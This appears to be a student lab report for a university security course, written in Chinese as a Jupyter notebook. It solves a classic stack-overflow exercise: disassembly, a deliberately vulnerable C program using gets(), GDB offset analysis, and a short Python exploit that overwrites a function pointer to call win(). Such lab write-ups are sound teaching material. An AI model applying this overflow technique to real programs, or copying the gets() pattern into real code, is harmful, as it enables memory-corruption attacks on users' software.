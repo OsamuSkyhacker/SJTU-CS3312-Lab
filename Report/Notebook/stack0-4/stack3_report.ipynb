{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CS3312 Lab Report Stack3\n",
    "\n",
    "Osamu Takenaka 520030990026"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 源码分析\n",
    "\n",
    "x86汇编代码(由objdump得到)：\n",
    "\n",
    "```asm\n",
    "\n",
    "08048424 <win>:\n",
    " 8048424:\t55                   \tpush   %ebp\n",
    " 8048425:\t89 e5                \tmov    %esp,%ebp\n",
    " 8048427:\t83 ec 18             \tsub    $0x18,%esp\n",
    " 804842a:\tc7 04 24 40 85 04 08 \tmovl   $0x8048540,(%esp)\n",
    " 8048431:\te8 2a ff ff ff       \tcall   8048360 <puts@plt>\n",
    " 8048436:\tc9                   \tleave  \n",
    " 8048437:\tc3                   \tret    \n",
    " \n",
    "08048438 <main>:\n",
    " 8048438:\t55                   \tpush   %ebp\n",
    " 8048439:\t89 e5                \tmov    %esp,%ebp\n",
    " 804843b:\t83 e4 f0             \tand    $0xfffffff0,%esp\n",
    " 804843e:\t83 ec 60             \tsub    $0x60,%esp\n",
    " 8048441:\tc7 44 24 5c 00 00 00 \tmovl   $0x0,0x5c(%esp)\n",
    " 8048448:\t00 \n",
    " 8048449:\t8d 44 24 1c          \tlea    0x1c(%esp),%eax\n",
    " 804844d:\t89 04 24             \tmov    %eax,(%esp)\n",
    " 8048450:\te8 db fe ff ff       \tcall   8048330 <gets@plt>\n",
    " 8048455:\t83 7c 24 5c 00       \tcmpl   $0x0,0x5c(%esp)\n",
    " 804845a:\t74 1b                \tje     8048477 <main+0x3f>\n",
    " 804845c:\tb8 60 85 04 08       \tmov    $0x8048560,%eax\n",
    " 8048461:\t8b 54 24 5c          \tmov    0x5c(%esp),%edx\n",
    " 8048465:\t89 54 24 04          \tmov    %edx,0x4(%esp)\n",
    " 8048469:\t89 04 24             \tmov    %eax,(%esp)\n",
    " 804846c:\te8 df fe ff ff       \tcall   8048350 <printf@plt>\n",
    " 8048471:\t8b 44 24 5c          \tmov    0x5c(%esp),%eax\n",
    " 8048475:\tff d0                \tcall   *%eax\n",
    " 8048477:\tc9                   \tleave  \n",
    " 8048478:\tc3                   \tret    \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "C语言源代码：\n",
    "```c\n",
    "#include <stdlib.h>\n",
    "#include <unistd.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "void win()\n",
    "{\n",
    "    printf(\"code flow successfully changed\\n\");\n",
    "}\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "    volatile int (*fp)();\n",
    "    char buffer[64];\n",
    "\n",
    "    fp = 0;\n",
    "\n",
    "    gets(buffer);\n",
    "\n",
    "    if(fp) {\n",
    "        printf(\"calling function pointer, jumping to 0x%08x\\n\", fp);\n",
    "        fp();\n",
    "    }\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "这段C程序同样是一个典型的缓冲区溢出漏洞：\n",
    "\n",
    "但是这次，我们需要通过改变`fp`变量的值来调用`win`函数。\n",
    "\n",
    "我们需要令`fp`的值等于`win`函数的地址，然后通过`fp()`来调用`win`函数。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### 变量以及函数位置确定"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`fp`:\n",
    "\n",
    "通过 `fp = 0`这句C代码可以很容易找到对应的汇编代码：\n",
    "\n",
    "```asm\n",
    " 8048441:\tc7 44 24 5c 00 00 00 \tmovl   $0x0,0x5c(%esp)\n",
    "```\n",
    "不难看出，`fp`变量的地址是0x5c(%esp)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`buffer`:\n",
    "\n",
    "通过这句C代码：\n",
    "```c\n",
    "    gets(buffer);\n",
    "```\n",
    "可以定位到汇编中对应的代码为：\n",
    "\n",
    "```asm\n",
    " 8048449:\t8d 44 24 1c          \tlea    0x1c(%esp),%eax\n",
    " 804844d:\t89 04 24             \tmov    %eax,(%esp)\n",
    " 8048450:\te8 db fe ff ff       \tcall   8048330 <gets@plt>\n",
    "```\n",
    "\n",
    "可以看出，`buffer`数组的开始地址是0x1c(%esp)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`win()`:\n",
    "\n",
    "通过以下关于win函数的汇编代码可以找到`win`函数的地址：\n",
    "\n",
    "```asm\n",
    "08048424 <win>:\n",
    "```\n",
    "\n",
    "`win`函数的地址是0x8048424"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "#### GDB调试\n",
    "\n",
    "- 接下来我们需要通过gdb，通过查看`%esp`的值，得到各个变量的地址。\n",
    "\n",
    "    添加断点在main，\n",
    "\n",
    "    <img src=\"https://cdn.mathpix.com/snip/images/-yNgttA41ElDJ7B5tdAS_2-karR3t_a3DNLAreGe2c8.original.fullsize.png\" width=\"30%\" />\n",
    "    \n",
    "    可以看到`%esp`的值是`0xffc597f0`，所以:\n",
    "\n",
    "    `fp`的地址是`0xffc597f0 + 0x5c = 0xffc5984c`\n",
    "\n",
    "    `buffer`的起始地址是`0xffc597f0 + 0x1c = 0xffc5980c`\n",
    "\n",
    "\n",
    "\n",
    "- 然后，运行`gets()`时，为了在打印内存时更容易找到`buffer`的区域，我们输入64个'a'，运行完`gets()`后，我们打印一下相关内存区域：\n",
    "\n",
    "    <img src=\"https://cdn.mathpix.com/snip/images/iB5ZTZJeQuHF0JbO2iAFbxieJZoTk5xkwLgGbNhhDnM.original.fullsize.png\" width=\"50%\" />\n",
    "\n",
    "\n",
    "    可以看到大片的`0x61`，即`a`，即为buffer的地址区域，为`0xffc5980c`至`0xffc5984b`，我们的计算是正确的。\n",
    "\n",
    "    可以看到`fp`的地址为`0xffc5984c`，紧挨着`buffer`的末尾。\n",
    "    \n",
    "- 接下来我们需要构造输入，使得`fp`的值变为`0x8048424`(win函数的地址)。\n",
    "\n",
    "    该系统为小端，所以`fp`在内存中应该是`0x24 0x84 0x04 0x08`（地址从左至右依次增大）。\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 攻击脚本内容\n",
    "\n",
    "script_stack3.py:\n",
    "\n",
    "```python\n",
    "import sys\n",
    "buffer = b'a' * 64\n",
    "modified = b'\\x24\\x84\\x04\\x08'\n",
    "ans = buffer + modified\n",
    "sys.stdout.buffer.write(ans)                   \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "    \n",
    "在终端中运行：\n",
    "\n",
    "```bash\n",
    "python3 script_stack3.py | ./stack3\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 结果（非GDB环境）\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/VXZZJaKImjTUUOIcNXqDOYQ1OcgsmR1XPeWS8ncvo-I.original.fullsize.png\" width=\"50%\" />\n",
    "\n",
    "攻击成功"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
